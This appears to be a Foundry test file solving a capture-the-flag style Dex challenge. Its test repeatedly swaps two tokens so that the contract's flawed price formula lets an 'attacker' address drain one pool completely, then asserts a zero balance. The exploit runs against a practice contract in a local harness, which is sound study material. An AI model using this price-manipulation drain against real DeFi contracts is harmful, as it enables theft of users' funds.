// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Dex} from "../src/Dex.sol";
import {SwappableToken} from "../src/Dex.sol";

contract CounterTest is Test {
    Dex public dex;
    SwappableToken public token1;
    SwappableToken public token2;
    address attacker = makeAddr("attacker");

    function setUp() public {
        dex = new Dex();
        token1 = new SwappableToken(address(dex), "token1", "TKN1", 10 ** 18);
        token2 = new SwappableToken(address(dex), "token2", "TKN2", 10 ** 18);
        dex.setTokens(address(token1), address(token2));
        token1.approve(address(this), address(dex), 100);
        token2.approve(address(this), address(dex), 100);
        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);
        assertTrue(dex.balanceOf(address(token1), address(dex)) == 100);
        assertTrue(dex.balanceOf(address(token2), address(dex)) == 100);
        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);
        assertTrue(token1.balanceOf(attacker) == 10);
        assertTrue(token2.balanceOf(attacker) == 10);
    }

    function test_DrainDex() public {
        vm.startPrank(attacker);

        uint count;
        while (true) {
            if (count == 0) {
                count++;
                uint amount = dex.getSwapPrice(
                    address(token1),
                    address(token2),
                    token1.balanceOf(attacker)
                );
                if (amount < token2.balanceOf(address(dex))) {
                    token1.approve(
                        attacker,
                        address(dex),
                        token1.balanceOf(attacker)
                    );
                    dex.swap(
                        address(token1),
                        address(token2),
                        token1.balanceOf(attacker)
                    );
                } else {
                    console.log("break");
                    break;
                }
            } else {
                count--;
                uint amount = dex.getSwapPrice(
                    address(token2),
                    address(token1),
                    token2.balanceOf(attacker)
                );
                if (amount < token1.balanceOf(address(dex))) {
                    token2.approve(
                        attacker,
                        address(dex),
                        token2.balanceOf(attacker)
                    );
                    dex.swap(
                        address(token2),
                        address(token1),
                        token2.balanceOf(attacker)
                    );
                } else {
                    console.log("break");
                    break;
                }
            }
        }

        if (count == 0) {
            token2.approve(
                attacker,
                address(dex),
                token2.balanceOf(address(dex))
            );
            dex.swap(
                address(token2),
                address(token1),
                token2.balanceOf(address(dex))
            );
            assertTrue(token1.balanceOf(address(dex)) == 0);
        } else {
            token1.approve(
                attacker,
                address(dex),
                token1.balanceOf(address(dex))
            );
            dex.swap(
                address(token1),
                address(token2),
                token1.balanceOf(address(dex))
            );
            assertTrue(token2.balanceOf(address(dex)) == 0);
        }

        vm.stopPrank();
    }
}
